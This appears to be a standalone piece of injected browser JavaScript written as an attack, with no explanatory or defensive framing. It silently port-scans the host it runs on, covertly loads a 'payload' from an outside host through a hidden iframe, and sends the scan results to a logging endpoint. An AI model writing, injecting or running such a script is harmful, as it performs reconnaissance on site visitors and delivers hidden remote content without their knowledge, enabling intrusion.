(async function(){
  const targets = [21, 22, 80, 443, 8080];
  let openPorts = [];

  for (let port of targets) {
    try {
      await fetch(`http://${location.hostname}:${port}`, {mode: 'no-cors'});
      openPorts.push(port);
    } catch (e) {}
  }

  const iframe = document.createElement("iframe");
  iframe.src = "http://example.com/payload";
  iframe.style.display = "none";
  document.body.appendChild(iframe);

  fetch("/log?recon=" + openPorts.join(","));
})();